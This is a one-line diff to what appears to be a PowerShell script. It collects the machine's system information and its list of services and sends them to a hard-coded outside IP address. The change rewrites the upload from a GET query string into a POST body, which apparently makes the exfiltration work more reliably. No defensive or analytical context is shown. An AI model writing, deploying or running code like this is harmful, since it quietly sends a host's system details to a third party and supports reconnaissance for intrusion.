@@ -1,1 +1,1 @@
-$infos = systeminfo;$task = Get-Service;$uri = 'http://178.170.58.9/post.php?prenom=';$LoginResponse=Invoke-WebRequest $uri + $infos + $task -SessionVariable 'Session' -Method 'GET'
+$infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;$Body = @{prenom = $infos + $task};$LoginResponse = Invoke-WebRequest 'http://178.170.58.9/post.php' -SessionVariable 'Session' -Body $Body -Method 'POST'
